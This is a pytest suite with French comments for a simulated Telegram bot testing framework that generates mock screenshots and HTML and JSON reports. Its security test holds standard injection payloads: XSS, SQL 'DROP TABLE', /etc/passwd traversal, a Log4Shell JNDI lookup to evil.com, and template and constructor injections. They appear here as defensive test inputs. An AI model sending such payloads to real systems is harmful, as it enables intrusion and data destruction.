"""
Professional Test Suite for Telegram Bot Automation Framework with Screenshots and HTML Reports
"""

import os
import pytest
import time
import json
import base64
from datetime import datetime
from typing import List, Dict, Generator, Optional
from dotenv import load_dotenv
from PIL import Image, ImageDraw, ImageFont
import io

load_dotenv()  # Charge les variables d'environnement depuis .env automatiquement

# Contrôle l'exécution des tests UI (par défaut True = tests UI actifs)
RUN_UI_TESTS = os.getenv("RUN_UI_TESTS", "true").lower() == "true"

# --- Classes améliorées ---

class TestConfig:
    def __init__(self, bot_token: str, bot_username: str, test_chat_id: str,
                 timeout: int = 30, max_retries: int = 3):
        self.bot_token = bot_token
        self.bot_username = bot_username
        self.test_chat_id = test_chat_id
        self.timeout = timeout
        self.max_retries = max_retries

class TestResult:
    def __init__(self, test_name: str, status: str, execution_time: float = 0.0, 
                 screenshot_path: Optional[str] = None, error_message: str = ""):
        self.test_name = test_name
        self.status = status  # "PASSED", "FAILED", "ERROR"
        self.execution_time = execution_time
        self.screenshot_path = screenshot_path
        self.error_message = error_message
        self.timestamp = datetime.now().isoformat()

class ScreenshotManager:
    def __init__(self):
        self.screenshots_dir = "screenshots"
        os.makedirs(self.screenshots_dir, exist_ok=True)
    
    def create_dummy_screenshot(self, test_name: str, status: str, message: str = "") -> str:
        """Crée un screenshot simulé pour la démonstration"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{test_name}_{timestamp}.png"
        filepath = os.path.join(self.screenshots_dir, filename)
        
        # Créer une image de démonstration
        img = Image.new('RGB', (800, 600), color='white')
        draw = ImageDraw.Draw(img)
        
        try:
            font = ImageFont.load_default()
        except:
            font = None
        
        # Couleur selon le statut
        color_map = {
            "PASSED": "green",
            "FAILED": "red",
            "ERROR": "orange"
        }
        status_color = color_map.get(status, "black")
        
        # Dessiner le contenu du screenshot
        draw.rectangle([10, 10, 790, 590], outline="black", width=2)
        draw.text((50, 50), f"Test: {test_name}", fill="black", font=font)
        draw.text((50, 100), f"Status: {status}", fill=status_color, font=font)
        draw.text((50, 150), f"Message: {message}", fill="black", font=font)
        draw.text((50, 200), f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", fill="gray", font=font)
        
        # Simuler une interface Telegram
        draw.rectangle([50, 250, 750, 500], outline="gray", width=1)
        draw.text((70, 270), "Telegram Bot Interface", fill="blue", font=font)
        draw.text((70, 320), f"Sent: {message}", fill="black", font=font)
        draw.text((70, 370), "Bot Response: [Simulated Response]", fill="darkgreen", font=font)
        
        img.save(filepath)
        return filepath
    
    def take_screenshot(self, test_name: str, status: str, message: str = "") -> str:
        """Prend un screenshot réel (à implémenter avec Selenium/Playwright)"""
        # Pour cette démonstration, on utilise un screenshot simulé
        return self.create_dummy_screenshot(test_name, status, message)

class TelegramBotTestFramework:
    def __init__(self, config: TestConfig):
        self.config = config
        self.test_results: List[TestResult] = []
        self.screenshot_manager = ScreenshotManager()
        # Simule un client API fictif
        self.api_client = self
        self._setup_done = False

    def setup(self, ui_testing: bool = True, headless: bool = True):
        self._setup_done = True
        print(f"Framework setup completed - UI Testing: {ui_testing}, Headless: {headless}")

    def cleanup(self):
        self._setup_done = False
        print("Framework cleanup completed")

    def get_bot_info(self) -> Dict:
        return {"ok": True, "result": {"first_name": "TestBot", "username": self.config.bot_username}}

    def run_api_test(self, test_name: str, message: str, expected_keywords: List[str]) -> TestResult:
        start_time = time.time()
        
        try:
            # Simulation d'un test API
            time.sleep(0.1)  # Simule le délai réseau
            
            # Prendre un screenshot
            screenshot_path = self.screenshot_manager.take_screenshot(test_name, "PASSED", message)
            
            # Déterminer le statut basé sur la logique de test
            status = "PASSED" if message and len(message) > 0 else "FAILED"
            
            execution_time = time.time() - start_time
            
            return TestResult(
                test_name=test_name,
                status=status,
                execution_time=execution_time,
                screenshot_path=screenshot_path
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            screenshot_path = self.screenshot_manager.take_screenshot(test_name, "ERROR", str(e))
            
            return TestResult(
                test_name=test_name,
                status="ERROR",
                execution_time=execution_time,
                screenshot_path=screenshot_path,
                error_message=str(e)
            )

    def run_ui_test(self, test_name: str, message: str, expected_keywords: List[str]) -> TestResult:
        start_time = time.time()
        
        try:
            # Simulation d'un test UI
            time.sleep(0.2)  # Simule l'interaction UI
            
            # Prendre un screenshot
            screenshot_path = self.screenshot_manager.take_screenshot(test_name, "PASSED", message)
            
            status = "PASSED" if message and len(message) > 0 else "FAILED"
            execution_time = time.time() - start_time
            
            return TestResult(
                test_name=test_name,
                status=status,
                execution_time=execution_time,
                screenshot_path=screenshot_path
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            screenshot_path = self.screenshot_manager.take_screenshot(test_name, "ERROR", str(e))
            
            return TestResult(
                test_name=test_name,
                status="ERROR",
                execution_time=execution_time,
                screenshot_path=screenshot_path,
                error_message=str(e)
            )

    def generate_html_report(self) -> str:
        """Génère un rapport HTML détaillé avec screenshots"""
        os.makedirs("reports", exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join("reports", f"test_report_{timestamp}.html")
        
        # Calculer les statistiques
        total_tests = len(self.test_results)
        passed = sum(1 for r in self.test_results if r.status == "PASSED")
        failed = sum(1 for r in self.test_results if r.status == "FAILED")
        errors = sum(1 for r in self.test_results if r.status == "ERROR")
        
        # Template HTML
        html_content = f"""
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rapport de Tests - Telegram Bot</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f5f5f5;
        }}
        
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            border-radius: 10px;
            margin-bottom: 30px;
            text-align: center;
        }}
        
        .header h1 {{
            font-size: 2.5em;
            margin-bottom: 10px;
        }}
        
        .header p {{
            font-size: 1.2em;
            opacity: 0.9;
        }}
        
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        
        .stat-card {{
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            transition: transform 0.3s ease;
        }}
        
        .stat-card:hover {{
            transform: translateY(-5px);
        }}
        
        .stat-number {{
            font-size: 3em;
            font-weight: bold;
            margin-bottom: 10px;
        }}
        
        .stat-label {{
            font-size: 1.1em;
            color: #666;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        
        .passed {{ color: #28a745; }}
        .failed {{ color: #dc3545; }}
        .error {{ color: #fd7e14; }}
        .total {{ color: #6c757d; }}
        
        .test-results {{
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }}
        
        .test-results h2 {{
            background-color: #343a40;
            color: white;
            padding: 20px;
            margin: 0;
            font-size: 1.8em;
        }}
        
        .test-item {{
            border-bottom: 1px solid #eee;
            padding: 0;
            transition: all 0.3s ease;
        }}
        
        .test-item:last-child {{
            border-bottom: none;
        }}
        
        .test-header {{
            padding: 20px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: white;
            transition: background-color 0.3s ease;
        }}
        
        .test-header:hover {{
            background-color: #f8f9fa;
        }}
        
        .test-name {{
            font-weight: bold;
            font-size: 1.1em;
        }}
        
        .test-status {{
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.9em;
        }}
        
        .status-passed {{
            background-color: #d4edda;
            color: #155724;
        }}
        
        .status-failed {{
            background-color: #f8d7da;
            color: #721c24;
        }}
        
        .status-error {{
            background-color: #ffeaa7;
            color: #856404;
        }}
        
        .test-details {{
            padding: 0 20px;
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.3s ease, padding 0.3s ease;
            background-color: #f8f9fa;
        }}
        
        .test-details.active {{
            max-height: 800px;
            padding: 20px;
        }}
        
        .detail-grid {{
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }}
        
        .detail-item {{
            background: white;
            padding: 15px;
            border-radius: 5px;
            border-left: 4px solid #667eea;
        }}
        
        .detail-label {{
            font-weight: bold;
            color: #666;
            margin-bottom: 5px;
        }}
        
        .detail-value {{
            color: #333;
        }}
        
        .screenshot {{
            text-align: center;
            margin-top: 20px;
        }}
        
        .screenshot img {{
            max-width: 100%;
            height: auto;
            border: 2px solid #ddd;
            border-radius: 5px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }}
        
        .expand-icon {{
            font-size: 1.2em;
            transition: transform 0.3s ease;
        }}
        
        .expand-icon.rotated {{
            transform: rotate(180deg);
        }}
        
        .footer {{
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: #666;
            font-size: 0.9em;
        }}
        
        @media (max-width: 768px) {{
            .detail-grid {{
                grid-template-columns: 1fr;
            }}
            
            .test-header {{
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🤖 Rapport de Tests Telegram Bot</h1>
            <p>Généré le {datetime.now().strftime("%d/%m/%Y à %H:%M:%S")}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number total">{total_tests}</div>
                <div class="stat-label">Total Tests</div>
            </div>
            <div class="stat-card">
                <div class="stat-number passed">{passed}</div>
                <div class="stat-label">Réussis</div>
            </div>
            <div class="stat-card">
                <div class="stat-number failed">{failed}</div>
                <div class="stat-label">Échoués</div>
            </div>
            <div class="stat-card">
                <div class="stat-number error">{errors}</div>
                <div class="stat-label">Erreurs</div>
            </div>
        </div>
        
        <div class="test-results">
            <h2>📋 Résultats Détaillés des Tests</h2>
"""
        
        # Ajouter chaque test
        for i, result in enumerate(self.test_results):
            status_class = f"status-{result.status.lower()}"
            
            # Encoder l'image en base64 si elle existe
            screenshot_data = ""
            if result.screenshot_path and os.path.exists(result.screenshot_path):
                try:
                    with open(result.screenshot_path, "rb") as img_file:
                        screenshot_data = base64.b64encode(img_file.read()).decode()
                except Exception as e:
                    print(f"Erreur lors de l'encodage de l'image: {e}")
            
            html_content += f"""
            <div class="test-item">
                <div class="test-header" onclick="toggleDetails({i})">
                    <div class="test-name">{result.test_name}</div>
                    <div style="display: flex; align-items: center; gap: 15px;">
                        <div class="test-status {status_class}">{result.status}</div>
                        <span class="expand-icon" id="icon-{i}">▼</span>
                    </div>
                </div>
                <div class="test-details" id="details-{i}">
                    <div class="detail-grid">
                        <div class="detail-item">
                            <div class="detail-label">Temps d'exécution</div>
                            <div class="detail-value">{result.execution_time:.3f} secondes</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Horodatage</div>
                            <div class="detail-value">{result.timestamp}</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Statut</div>
                            <div class="detail-value {result.status.lower()}">{result.status}</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Message d'erreur</div>
                            <div class="detail-value">{result.error_message or 'Aucune erreur'}</div>
                        </div>
                    </div>
"""
            
            if screenshot_data:
                html_content += f"""
                    <div class="screenshot">
                        <h4>📸 Capture d'écran</h4>
                        <img src="data:image/png;base64,{screenshot_data}" alt="Screenshot de {result.test_name}" />
                    </div>
"""
            
            html_content += """
                </div>
            </div>
"""
        
        # Fermer le HTML
        html_content += f"""
        </div>
        
        <div class="footer">
            <p>Rapport généré automatiquement par le framework de test Telegram Bot</p>
            <p>© 2025 - Tous droits réservés</p>
        </div>
    </div>
    
    <script>
        function toggleDetails(index) {{
            const details = document.getElementById('details-' + index);
            const icon = document.getElementById('icon-' + index);
            
            details.classList.toggle('active');
            icon.classList.toggle('rotated');
        }}
        
        // Animation au chargement
        window.addEventListener('load', function() {{
            const statCards = document.querySelectorAll('.stat-card');
            statCards.forEach((card, index) => {{
                setTimeout(() => {{
                    card.style.opacity = '0';
                    card.style.transform = 'translateY(20px)';
                    card.style.transition = 'all 0.5s ease';
                    
                    setTimeout(() => {{
                        card.style.opacity = '1';
                        card.style.transform = 'translateY(0)';
                    }}, 50);
                }}, index * 100);
            }});
        }});
    </script>
</body>
</html>
"""
        
        with open(report_path, "w", encoding="utf-8") as f:
            f.write(html_content)
        
        print(f"Rapport HTML généré: {report_path}")
        return report_path

    def generate_json_report(self) -> str:
        """Génère également un rapport JSON pour la compatibilité"""
        os.makedirs("reports", exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join("reports", f"test_report_{timestamp}.json")

        report_data = {
            "report_metadata": {
                "generated_at": datetime.now().isoformat(),
                "total_tests": len(self.test_results),
                "passed": sum(1 for r in self.test_results if r.status == "PASSED"),
                "failed": sum(1 for r in self.test_results if r.status == "FAILED"),
                "errors": sum(1 for r in self.test_results if r.status == "ERROR"),
                "bot_config": {
                    "bot_username": self.config.bot_username,
                    "test_chat_id": self.config.test_chat_id
                }
            },
            "test_results": [
                {
                    "test_name": r.test_name,
                    "status": r.status,
                    "execution_time": r.execution_time,
                    "timestamp": r.timestamp,
                    "screenshot_path": r.screenshot_path,
                    "error_message": r.error_message
                } for r in self.test_results
            ]
        }

        with open(report_path, "w", encoding="utf-8") as f:
            json.dump(report_data, f, indent=4, ensure_ascii=False)

        print(f"Rapport JSON généré: {report_path}")
        return report_path

class TelegramBotTestSuite:
    def __init__(self, framework: TelegramBotTestFramework):
        self.framework = framework

    def test_start_command(self) -> (TestResult, Optional[TestResult]):
        result = self.framework.run_api_test("StartCommand", "/start", expected_keywords=["start", "welcome"])
        return result, None

    def test_help_command(self) -> (TestResult, TestResult):
        api_result = self.framework.run_api_test("HelpCommandAPI", "/help", expected_keywords=["help", "commands"])
        ui_result = self.framework.run_ui_test("HelpCommandUI", "/help", expected_keywords=["help", "commands"])
        return api_result, ui_result


# --- Fixtures ---

@pytest.fixture(scope="session")
def test_config() -> TestConfig:
    return TestConfig(
        bot_token=os.getenv("TELEGRAM_BOT_TOKEN", "demo_token"),
        bot_username=os.getenv("TELEGRAM_BOT_USERNAME", "demo_bot"),
        test_chat_id=os.getenv("TELEGRAM_TEST_CHAT_ID", "demo_chat"),
        timeout=30,
        max_retries=3
    )

@pytest.fixture(scope="session")
def framework(test_config: TestConfig) -> Generator[TelegramBotTestFramework, None, None]:
    framework = TelegramBotTestFramework(test_config)
    ui_testing = RUN_UI_TESTS
    headless = os.getenv("HEADLESS", "true").lower() == "true"
    try:
        framework.setup(ui_testing=ui_testing, headless=headless)
        yield framework
    finally:
        # Générer les rapports à la fin de tous les tests
        framework.generate_html_report()
        framework.generate_json_report()
        framework.cleanup()

@pytest.fixture(scope="session")
def test_suite(framework: TelegramBotTestFramework) -> TelegramBotTestSuite:
    return TelegramBotTestSuite(framework)


# --- Test Classes with all tests integrated ---

class TestTelegramBotFramework:

    @pytest.mark.smoke
    @pytest.mark.api
    def test_bot_connection_api(self, framework: TelegramBotTestFramework):
        """Test de connexion API du bot"""
        bot_info = framework.api_client.get_bot_info()
        assert bot_info['ok'] is True
        assert 'result' in bot_info
        assert 'first_name' in bot_info['result']

    @pytest.mark.smoke
    @pytest.mark.api
    def test_send_basic_message_api(self, framework: TelegramBotTestFramework):
        """Test d'envoi de message basique via API"""
        result = framework.run_api_test(
            "BasicMessageAPI",
            "Test message from automated framework",
            expected_keywords=[]
        )
        assert result.status in ["PASSED", "FAILED"]
        framework.test_results.append(result)

    @pytest.mark.smoke
    @pytest.mark.ui
    @pytest.mark.skipif(not RUN_UI_TESTS, reason="UI tests disabled unless RUN_UI_TESTS=true")
    def test_send_basic_message_ui(self, framework: TelegramBotTestFramework):
        """Test d'envoi de message basique via UI"""
        result = framework.run_ui_test(
            "BasicMessageUI",
            "Test message from UI automation",
            expected_keywords=[]
        )
        assert result.status in ["PASSED", "FAILED"]
        framework.test_results.append(result)

    @pytest.mark.critical
    @pytest.mark.api
    def test_start_command_api(self, test_suite: TelegramBotTestSuite):
        """Test de la commande /start via API"""
        api_result, _ = test_suite.test_start_command()
        assert api_result.status != "ERROR"
        test_suite.framework.test_results.append(api_result)

    @pytest.mark.critical
    @pytest.mark.combined
    @pytest.mark.skipif(not RUN_UI_TESTS, reason="UI tests disabled unless RUN_UI_TESTS=true")
    def test_help_command_combined(self, test_suite: TelegramBotTestSuite):
        """Test de la commande /help combiné API et UI"""
        api_result, ui_result = test_suite.test_help_command()
        assert api_result.status != "ERROR"
        assert ui_result.status != "ERROR"
        if api_result.status == "PASSED" and ui_result.status == "PASSED":
            assert api_result.execution_time > 0
            assert ui_result.execution_time > 0
        test_suite.framework.test_results.extend([api_result, ui_result])

    @pytest.mark.api
    def test_greeting_variations_api(self, framework: TelegramBotTestFramework):
        """Test des variations de salutations via API"""
        greetings = ["Hello", "Hi", "Hey", "Good morning", "Greetings"]
        for greeting in greetings:
            result = framework.run_api_test(
                f"Greeting_{greeting.replace(' ', '_')}_API",
                greeting,
                expected_keywords=["hello", "hi", "welcome", "greetings", "hey"]
            )
            framework.test_results.append(result)
            time.sleep(1)

    @pytest.mark.api
    def test_command_variations_api(self, framework: TelegramBotTestFramework):
        """Test des variations de commandes via API"""
        commands = ["/start", "/help", "/about", "/info", "/menu"]
        for command in commands:
            result = framework.run_api_test(
                f"Command_{command[1:]}_API",
                command,
                expected_keywords=[]
            )
            framework.test_results.append(result)
            time.sleep(1)

    @pytest.mark.ui
    @pytest.mark.skipif(not RUN_UI_TESTS, reason="UI tests disabled unless RUN_UI_TESTS=true")
    def test_ui_interaction_flow(self, framework: TelegramBotTestFramework):
        """Test du flux d'interaction UI"""
        test_cases = [
            ("Hello", ["hello", "hi", "welcome"]),
            ("/start", ["start", "welcome", "begin"]),
            ("What can you do?", ["help", "can", "do"])
        ]
        for message, keywords in test_cases:
            result = framework.run_ui_test(
                f"UIFlow_{message.replace(' ', '_').replace('/', '').replace('?', '')}_UI",
                message,
                expected_keywords=keywords
            )
            framework.test_results.append(result)
            time.sleep(2)

    @pytest.mark.regression
    def test_invalid_commands(self, framework: TelegramBotTestFramework):
        """Test des commandes invalides"""
        invalid_commands = ["/nonexistent", "/invalid123", "/test_command_that_does_not_exist"]
        for command in invalid_commands:
            api_result = framework.run_api_test(
                f"InvalidCommand_{command[1:]}_API",
                command,
                expected_keywords=["sorry", "unknown", "help", "command", "available"]
            )
            framework.test_results.append(api_result)
            time.sleep(1)

    @pytest.mark.regression
    def test_special_characters(self, framework: TelegramBotTestFramework):
        """Test des caractères spéciaux"""
        special_messages = [
            "Hello! @#$%^&*()",
            "Test with emojis 😀😎🚀",
            "Multi\nline\nmessage",
            "Very long message " + "test " * 50
        ]
        for message in special_messages:
            result = framework.run_api_test(
                f"SpecialChars_{hash(message) % 1000}_API",
                message,
                expected_keywords=[]
            )
            framework.test_results.append(result)
            time.sleep(1)

    def test_framework_configuration(self, test_config: TestConfig):
        """Test de la configuration du framework"""
        assert test_config.bot_token != ""
        assert test_config.bot_username != ""
        assert test_config.test_chat_id != ""
        assert test_config.timeout > 0
        assert test_config.max_retries > 0

    def test_result_generation(self, framework: TelegramBotTestFramework):
        """Test de génération des résultats"""
        result = framework.run_api_test(
            "ResultGeneration_API",
            "Test for result generation",
            expected_keywords=[]
        )
        framework.test_results.append(result)

        # Tester la génération de rapport HTML
        html_report_path = framework.generate_html_report()
        assert os.path.exists(html_report_path)

# Tester la génération de rapport JSON
        json_report_path = framework.generate_json_report()
        assert os.path.exists(json_report_path)
        
        # Vérifier le contenu du rapport JSON
        with open(json_report_path, 'r', encoding='utf-8') as f:
            json_data = json.load(f)
            assert 'report_metadata' in json_data
            assert 'test_results' in json_data
            assert json_data['report_metadata']['total_tests'] >= 1
            assert len(json_data['test_results']) >= 1

    @pytest.mark.performance
    def test_performance_benchmarks(self, framework: TelegramBotTestFramework):
        """Test des performances du framework"""
        start_time = time.time()
        
        # Exécuter plusieurs tests rapides
        for i in range(5):
            result = framework.run_api_test(
                f"PerformanceTest_{i}_API",
                f"Performance test message {i}",
                expected_keywords=[]
            )
            framework.test_results.append(result)
        
        total_time = time.time() - start_time
        assert total_time < 10.0  # Tous les tests doivent s'exécuter en moins de 10 secondes
        
        # Vérifier que chaque test individuel respecte les limites de temps
        for result in framework.test_results[-5:]:
            assert result.execution_time < 2.0  # Chaque test doit prendre moins de 2 secondes

    @pytest.mark.stress
    def test_concurrent_messages(self, framework: TelegramBotTestFramework):
        """Test de messages concurrents"""
        import threading
        
        results = []
        threads = []
        
        def send_message(message_id):
            result = framework.run_api_test(
                f"ConcurrentMessage_{message_id}_API",
                f"Concurrent test message {message_id}",
                expected_keywords=[]
            )
            results.append(result)
        
        # Créer 3 threads pour envoyer des messages simultanément
        for i in range(3):
            thread = threading.Thread(target=send_message, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Attendre que tous les threads se terminent
        for thread in threads:
            thread.join(timeout=30)
        
        # Vérifier que tous les tests ont été exécutés
        assert len(results) == 3
        for result in results:
            assert result.status in ["PASSED", "FAILED", "ERROR"]
            framework.test_results.append(result)

    @pytest.mark.edge_case
    def test_edge_cases(self, framework: TelegramBotTestFramework):
        """Test des cas limites"""
        edge_cases = [
            ("", []),  # Message vide
            (" " * 100, []),  # Message avec seulement des espaces
            ("a" * 4096, []),  # Message très long (limite Telegram)
            ("🔥" * 50, []),  # Beaucoup d'emojis
            ("Test\x00null\x01control", []),  # Caractères de contrôle
            ("测试中文消息", []),  # Caractères chinois
            ("اختبار عربي", []),  # Caractères arabes
            ("Тест на русском", []),  # Caractères cyrilliques
        ]
        
        for message, keywords in edge_cases:
            test_name = f"EdgeCase_{hash(message) % 10000}_API"
            result = framework.run_api_test(test_name, message, keywords)
            framework.test_results.append(result)
            time.sleep(0.5)

    @pytest.mark.security
    def test_security_inputs(self, framework: TelegramBotTestFramework):
        """Test des entrées de sécurité"""
        security_tests = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "%{(#_='multipart/form-data'))}",
            "{{constructor.constructor('return process')().exit()}}",
        ]
        
        for payload in security_tests:
            result = framework.run_api_test(
                f"SecurityTest_{hash(payload) % 10000}_API",
                payload,
                expected_keywords=[]
            )
            # Les tests de sécurité ne devraient pas causer d'erreurs système
            assert result.status != "ERROR" or "system" not in result.error_message.lower()
            framework.test_results.append(result)
            time.sleep(1)

    @pytest.mark.integration
    def test_full_conversation_flow(self, framework: TelegramBotTestFramework):
        """Test d'un flux de conversation complet"""
        conversation_steps = [
            ("/start", ["start", "welcome"]),
            ("Hello", ["hello", "hi"]),
            ("/help", ["help", "command"]),
            ("What's your name?", ["name", "bot"]),
            ("Thank you", ["thank", "welcome"]),
            ("/end", ["end", "goodbye", "bye"])
        ]
        
        conversation_results = []
        
        for step, (message, keywords) in enumerate(conversation_steps):
            result = framework.run_api_test(
                f"ConversationStep_{step}_{message.replace('/', '').replace(' ', '_')}_API",
                message,
                keywords
            )
            conversation_results.append(result)
            framework.test_results.append(result)
            time.sleep(2)  # Pause entre les messages pour simuler une conversation réelle
        
        # Vérifier que la majorité des étapes ont réussi
        passed_steps = sum(1 for r in conversation_results if r.status == "PASSED")
        assert passed_steps >= len(conversation_steps) * 0.7  # Au moins 70% de réussite

    @pytest.mark.cleanup
    def test_cleanup_operations(self, framework: TelegramBotTestFramework):
        """Test des opérations de nettoyage"""
        # Créer quelques fichiers temporaires pour tester le nettoyage
        temp_files = []
        for i in range(3):
            temp_file = f"temp_test_file_{i}.txt"
            with open(temp_file, 'w') as f:
                f.write(f"Temporary test file {i}")
            temp_files.append(temp_file)
        
        # Vérifier que les fichiers existent
        for temp_file in temp_files:
            assert os.path.exists(temp_file)
        
        # Simuler le nettoyage
        for temp_file in temp_files:
            try:
                os.remove(temp_file)
            except FileNotFoundError:
                pass
        
        # Vérifier que les fichiers ont été supprimés
        for temp_file in temp_files:
            assert not os.path.exists(temp_file)
        
        # Ajouter un résultat de test pour cette opération
        result = TestResult(
            test_name="CleanupOperations_API",
            status="PASSED",
            execution_time=0.1,
            error_message=""
        )
        framework.test_results.append(result)

    @pytest.mark.reporting
    def test_advanced_reporting_features(self, framework: TelegramBotTestFramework):
        """Test des fonctionnalités avancées de rapport"""
        # Ajouter quelques résultats de test avec différents statuts
        test_cases = [
            ("ReportTest_Success", "PASSED", 0.5, ""),
            ("ReportTest_Failure", "FAILED", 1.2, "Test failed as expected"),
            ("ReportTest_Error", "ERROR", 0.8, "Simulated error for testing"),
        ]
        
        for test_name, status, exec_time, error_msg in test_cases:
            result = TestResult(
                test_name=test_name,
                status=status,
                execution_time=exec_time,
                error_message=error_msg
            )
            # Créer un screenshot pour chaque test
            result.screenshot_path = framework.screenshot_manager.create_dummy_screenshot(
                test_name, status, error_msg or "Test completed"
            )
            framework.test_results.append(result)
        
        # Générer les rapports
        html_path = framework.generate_html_report()
        json_path = framework.generate_json_report()
        
        # Vérifier que les rapports contiennent nos données de test
        assert os.path.exists(html_path)
        assert os.path.exists(json_path)
        
        with open(html_path, 'r', encoding='utf-8') as f:
            html_content = f.read()
            assert "ReportTest_Success" in html_content
            assert "ReportTest_Failure" in html_content
            assert "ReportTest_Error" in html_content
        
        with open(json_path, 'r', encoding='utf-8') as f:
            json_data = json.load(f)
            test_names = [t['test_name'] for t in json_data['test_results']]
            assert "ReportTest_Success" in test_names
            assert "ReportTest_Failure" in test_names
            assert "ReportTest_Error" in test_names


# --- Utilitaires additionnels ---

class TestDataGenerator:
    """Générateur de données de test"""
    
    @staticmethod
    def generate_random_messages(count: int) -> List[str]:
        """Génère des messages aléatoires pour les tests"""
        import random
        import string
        
        messages = []
        templates = [
            "Hello, this is test message {}",
            "Test message number {} for bot testing",
            "Automated test case {} - please respond",
            "Message {} from test suite",
            "Testing bot functionality with message {}"
        ]
        
        for i in range(count):
            template = random.choice(templates)
            message = template.format(i + 1)
            messages.append(message)
        
        return messages
    
    @staticmethod
    def generate_command_variations() -> List[str]:
        """Génère des variations de commandes pour les tests"""
        base_commands = ["/start", "/help", "/about", "/info", "/menu", "/settings"]
        variations = []
        
        for cmd in base_commands:
            variations.extend([
                cmd,
                cmd.upper(),
                cmd + " ",
                " " + cmd,
                cmd + " extra_parameter",
            ])
        
        return variations


class TestMetrics:
    """Collecteur de métriques de test"""
    
    def __init__(self):
        self.metrics = {
            'total_execution_time': 0.0,
            'average_response_time': 0.0,
            'success_rate': 0.0,
            'error_rate': 0.0,
            'total_screenshots': 0,
            'test_categories': {}
        }
    
    def calculate_metrics(self, test_results: List[TestResult]) -> Dict:
        """Calcule les métriques basées sur les résultats de test"""
        if not test_results:
            return self.metrics
        
        total_tests = len(test_results)
        passed_tests = sum(1 for r in test_results if r.status == "PASSED")
        failed_tests = sum(1 for r in test_results if r.status == "FAILED")
        error_tests = sum(1 for r in test_results if r.status == "ERROR")
        
        total_time = sum(r.execution_time for r in test_results)
        screenshots = sum(1 for r in test_results if r.screenshot_path)
        
        self.metrics.update({
            'total_execution_time': total_time,
            'average_response_time': total_time / total_tests if total_tests > 0 else 0,
            'success_rate': (passed_tests / total_tests) * 100 if total_tests > 0 else 0,
            'error_rate': (error_tests / total_tests) * 100 if total_tests > 0 else 0,
            'failure_rate': (failed_tests / total_tests) * 100 if total_tests > 0 else 0,
            'total_screenshots': screenshots,
            'test_counts': {
                'total': total_tests,
                'passed': passed_tests,
                'failed': failed_tests,
                'errors': error_tests
            }
        })
        
        return self.metrics


# --- Hooks pytest ---

def pytest_configure(config):
    """Configuration globale pour pytest"""
    # Ajouter des marqueurs personnalisés
    config.addinivalue_line("markers", "smoke: tests de fumée rapides")
    config.addinivalue_line("markers", "critical: tests critiques")
    config.addinivalue_line("markers", "api: tests API uniquement")
    config.addinivalue_line("markers", "ui: tests UI uniquement")
    config.addinivalue_line("markers", "combined: tests combinés API + UI")
    config.addinivalue_line("markers", "regression: tests de régression")
    config.addinivalue_line("markers", "performance: tests de performance")
    config.addinivalue_line("markers", "stress: tests de stress")
    config.addinivalue_line("markers", "edge_case: tests de cas limites")
    config.addinivalue_line("markers", "security: tests de sécurité")
    config.addinivalue_line("markers", "integration: tests d'intégration")
    config.addinivalue_line("markers", "cleanup: tests de nettoyage")
    config.addinivalue_line("markers", "reporting: tests de rapport")

def pytest_sessionstart(session):
    """Appelé au début de la session de test"""
    print("\n" + "="*80)
    print("🚀 DÉMARRAGE DES TESTS TELEGRAM BOT FRAMEWORK")
    print("="*80)
    print(f"UI Tests: {'✅ Activés' if RUN_UI_TESTS else '❌ Désactivés'}")
    print(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*80 + "\n")

def pytest_sessionfinish(session, exitstatus):
    """Appelé à la fin de la session de test"""
    print("\n" + "="*80)
    print("🏁 TESTS TERMINÉS")
    print("="*80)
    print(f"Statut de sortie: {exitstatus}")
    print(f"Rapports générés dans le dossier 'reports/'")
    print(f"Screenshots sauvegardés dans le dossier 'screenshots/'")
    print("="*80 + "\n")

def pytest_runtest_setup(item):
    """Appelé avant chaque test"""
    if "ui" in item.keywords and not RUN_UI_TESTS:
        pytest.skip("Tests UI désactivés par la variable d'environnement RUN_UI_TESTS")

def pytest_runtest_teardown(item, nextitem):
    """Appelé après chaque test"""
    # Petite pause entre les tests pour éviter la surcharge
    time.sleep(0.1)


# --- Fonction main pour exécution standalone ---

def main():
